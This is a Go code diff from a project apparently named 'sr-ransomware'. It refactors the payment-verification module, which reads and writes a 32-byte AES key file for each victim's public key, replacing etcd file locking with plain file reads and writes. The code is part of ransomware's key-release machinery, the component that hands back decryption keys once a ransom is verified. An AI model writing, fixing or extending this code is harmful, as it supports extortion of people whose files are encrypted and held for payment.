@@ -19,7 +19,6 @@ import (
     "github.com/sug0/sr-ransomware/go/crypto/util"
     "github.com/sug0/sr-ransomware/go/net/ratelimit"
     ethereum "github.com/ethereum/go-ethereum/crypto"
-    "github.com/coreos/etcd/pkg/fileutil"
 )
 
 //go:generate go run generate/key.go
@@ -69,14 +68,11 @@ func NewSchemeWithPath(path string) *Scheme {
 }
 
 func (s *Scheme) VerifyPayment(pubkey string) []byte {
-    clr, err := fileutil.LockFile(filepath.Join(s.path, pubkey, "clr"), os.O_RDONLY, 0600)
+    aesIVKey, err := ioutil.ReadFile(filepath.Join(s.path, pubkey, "clr"))
     if err != nil {
         return nil
     }
-    defer clr.Close()
-    aesIVKey := make([]byte, 32)
-    _, err = io.ReadFull(clr, aesIVKey)
-    if err != nil {
+    if len(aesIVKey) != 32 {
         return nil
     }
     return aesIVKey
@@ -99,7 +95,7 @@ func (s *Scheme) VerifyPaymentsBackground() {
         dir.Close()
         for i := 0; i < len(ents); i++ {
             pubkey := ents[i].Name()
-            clr, err := fileutil.LockFile(filepath.Join(s.path, pubkey, "clr"), os.O_CREATE|os.O_WRONLY, 0600)
+            clr, err := os.OpenFile(filepath.Join(s.path, pubkey, "clr"), os.O_CREATE|os.O_WRONLY, 0600)
             if err != nil {
                 continue
             }
